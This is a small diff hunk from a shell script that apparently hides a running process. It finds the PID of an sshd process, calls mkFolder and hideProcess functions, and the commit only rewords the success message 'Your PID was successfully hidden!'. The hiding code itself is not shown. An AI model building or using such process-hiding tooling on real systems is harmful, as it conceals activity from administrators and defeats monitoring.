@@ -33,7 +33,7 @@ done
 echo -ne "\r"
 pid=$(ps auxf | grep "sshd" | head -n 1 | awk -F' ' '{print $2}')
 
-mesg="Your PID was successfully hidden!"
+mesg="Your PID is successfully hidden!"
 
 mkFolder && hideProcess && \
 
